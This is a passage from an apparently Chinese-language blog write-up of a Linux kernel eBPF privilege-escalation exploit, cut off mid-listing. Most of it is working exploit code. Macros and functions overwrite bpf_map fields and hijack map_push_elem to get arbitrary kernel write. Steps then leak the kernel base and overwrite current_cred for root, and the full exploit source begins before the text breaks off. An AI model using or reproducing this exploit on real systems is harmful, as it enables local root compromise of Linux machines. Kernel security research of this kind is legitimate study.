<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">array_map_get_next_key</span><span class="params">(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key, <span class="keyword">void</span> *next_key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_array</span> *<span class="title">array</span> =</span> container_of(<span class="built_in">map</span>, struct bpf_array, <span class="built_in">map</span>);</span><br><span class="line">	u32 index = key ? *(u32 *)key : U32_MAX;</span><br><span class="line">	u32 *next = (u32 *)next_key;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (index &gt;= <span class="built_in">array</span>-&gt;<span class="built_in">map</span>.max_entries) &#123;</span><br><span class="line">		*next = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (index == <span class="built_in">array</span>-&gt;<span class="built_in">map</span>.max_entries - <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> -ENOENT;</span><br><span class="line"></span><br><span class="line">	*next = index + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>当 <code>key</code> 小于 <code>map.max_entries</code> 时，<code>key</code> 会被写入到 <code>next_key</code> 当中 </li>
<li>如果正常调用 <code>map_get_next_key</code>：只能控制 <code>key</code> 但是 <code>next_key</code> 不能控制</li>
<li>如果通过函数指针 <code>ops-&gt;map_push_elem</code> 进行调用：可以控制这两个参数</li>
</ul>
<p>当我们更新 eBPF map 时，若 map 类型为 <code>BPF_MAP_TYPE_QUEUE</code> 或 <code>BPF_MAP_TYPE_STACK</code>，则函数 <code>bpf_map-&gt;ops-&gt;map_push_elem</code> 就会被调用，不过在函数 <code>map_update_elem</code> 中还有一个检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_update_elem</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((attr-&gt;flags &amp; BPF_F_LOCK) &amp;&amp;</span><br><span class="line">	    !map_value_has_spin_lock(<span class="built_in">map</span>)) &#123;</span><br><span class="line">		err = -EINVAL;</span><br><span class="line">		<span class="keyword">goto</span> err_put;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">map_value_has_spin_lock</span><span class="params">(<span class="keyword">const</span> struct bpf_map *<span class="built_in">map</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">map</span>-&gt;spin_lock_off &gt;= <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>若 flags 设置了 <code>BPF_F_LOCK</code> 标志位，则会检查 <code>map-&gt;spin_lock_off</code> 是否大于等于 0，因此这里我们还要将该字段改为一个正整数</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAKE_ARBITRARY_WRITE_OPS(__map_fd)                  \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* extend the alu_limit */</span>                          \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7),     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),       \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),                 \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* overwrite spin_lock_off */</span>                       \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xE4),             \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_5, 0x2000),                   \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),        \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* overwrite max_entries */</span>                         \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x8),              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_5, 0xffffffff),               \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),        \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* overwrite map_type */</span>                            \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xC),              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_5, 23),                       \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),        \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* overwrite the map-&gt;ops */</span>                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x18),             \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),        \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(2, __map_fd, BPF_REG_4),     \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_4, 0),       \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_5, 0)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>前半部分使用相同的方法来绕过 <code>alu_limit</code>，后半部分尝试覆盖 <code>bpf_map</code> 中的各个条目：<ul>
<li><code>spin_lock_off = 0x2000</code>（绕过 <code>map_update_elem</code> 中的检查）</li>
<li><code>max_entries = 0xffffffff</code>（为了满足 <code>key &lt; map.max_entries</code> 的条件）</li>
<li><code>map_type = 23(BPF_MAP_TYPE_STACK)</code>（为了使 <code>bpf_map-&gt;ops-&gt;map_push_elem</code> 能被调用）</li>
<li><code>ops = target_addr</code>（设置写入的目标地址）</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">make_arbitrary_write_ops</span><span class="params">(<span class="keyword">int</span> map_fd)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">prog</span>[] =</span> &#123;</span><br><span class="line">        TRIGGER_VULN(map_fd),</span><br><span class="line">        MAKE_VULN_REG(map_fd),</span><br><span class="line">        MAKE_ARBITRARY_WRITE_OPS(map_fd),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line">    <span class="keyword">int</span> key;</span><br><span class="line">    <span class="keyword">size_t</span> per_ops_ptr, value[<span class="number">0x1000</span>], value_idx;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops_data</span>;</span></span><br><span class="line"></span><br><span class="line">    fake_ops_addr = map_addr + <span class="number">0x110</span> + MAP_SIZE; <span class="comment">/* save fake ops addr into map */</span></span><br><span class="line"></span><br><span class="line">    value_idx = <span class="number">0</span>; <span class="comment">/* 读取bpf_map-&gt;ops,以保证程序的正常功能 */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(struct bpf_map_ops); i += <span class="number">8</span>)&#123;</span><br><span class="line">        per_ops_ptr = read_arbitrary_addr(map_fd, map_ops_addr + i);</span><br><span class="line">        value[value_idx++] = per_ops_ptr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ops_data = (struct bpf_map_ops *)value; <span class="comment">/* 覆写bpf_map-&gt;ops-&gt;map_push_elem */</span></span><br><span class="line">    ops_data-&gt;map_push_elem = (<span class="keyword">void</span> *)(ARRAY_MAP_GET_NEXT_KEY + kernel_offset);</span><br><span class="line">    key = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="number">0</span>], <span class="number">0</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to look up value!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    key = <span class="number">2</span>;</span><br><span class="line">    value[<span class="number">0</span>] = fake_ops_addr;</span><br><span class="line">    <span class="keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="number">0</span>], <span class="number">0</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to look up value!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    run_bpf_prog(prog, <span class="keyword">sizeof</span>(prog) / <span class="keyword">sizeof</span>(prog[<span class="number">0</span>]), <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在获取以上所有组件之后，程序的入侵步骤如下：</p>
<ul>
<li>泄露 <code>map_ops_addr</code> 计算内核基地址</li>
<li>泄露 <code>map_addr</code></li>
<li>利用 RAA 扫描内存，泄露 <code>current_task</code> 和 <code>current_cred</code></li>
<li>覆盖 <code>bpf_map-&gt;ops-&gt;map_push_elem</code>，为 WAA 做准备</li>
<li>利用 WAA 覆盖 <code>current_cred</code> 并进行提权</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> <span class="title">err_print</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Run eBPF error: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)          \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn) &#123;                                \</span></span><br><span class="line"><span class="meta">        .code        = CODE,                            \</span></span><br><span class="line"><span class="meta">        .dst_reg     = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg     = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off         = OFF,                             \</span></span><br><span class="line"><span class="meta">        .imm         = IMM                              \</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_REG(OP, DST, SRC)                     \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_X, DST, SRC, 0, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU32_REG(OP, DST, SRC)                     \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_ALU | BPF_OP(OP) | BPF_X, DST, SRC, 0, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_IMM(OP, DST, IMM)                     \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU32_IMM(OP, DST, IMM)                     \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_ALU | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_REG(DST, SRC)                         \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_X, DST, SRC, 0, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_REG(DST, SRC)                         \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_X, DST, SRC, 0, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_IMM(DST, IMM)                         \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, DST, 0, 0, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_IMM(DST, IMM)                         \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_K, DST, 0, 0, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64_RAW(DST, SRC, IMM)                 \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_LD | BPF_DW | BPF_IMM, DST, SRC, 0, (uint32_t) (IMM)),\</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(0, 0, 0, 0, ((uint64_t) (IMM)) &gt;&gt; 32)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64(DST, IMM)                          \</span></span><br><span class="line"><span class="meta">        BPF_LD_IMM64_RAW(DST, 0, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> BPF_PSEUDO_MAP_FD</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> BPF_PSEUDO_MAP_FD	1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_MAP_FD(DST, MAP_FD)                      \</span></span><br><span class="line"><span class="meta">        BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Direct packet access, R0 = *(uint *) (skb-&gt;data + imm32) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_ABS(SIZE, IMM)                           \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, 0, 0, 0, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* dst_reg = *(uint *) (src_reg + off16) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LDX_MEM(SIZE, DST, SRC, OFF)                \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* *(uint *) (dst_reg + off16) = src_reg */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_STX_MEM(SIZE, DST, SRC, OFF)                \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ATOMIC_OP(SIZE, OP, DST, SRC, OFF)          \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_STX | BPF_SIZE(SIZE) | BPF_ATOMIC, DST, SRC, OFF, OP)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_STX_XADD(SIZE, DST, SRC, OFF)               \</span></span><br><span class="line"><span class="meta">        BPF_ATOMIC_OP(SIZE, BPF_ADD, DST, SRC, OFF)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* *(uint *) (dst_reg + off16) = imm */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ST_MEM(SIZE, DST, OFF, IMM)                 \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, DST, 0, OFF, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP_REG(OP, DST, SRC, OFF)                  \</span></span><br><span class="line"><span class="meta">        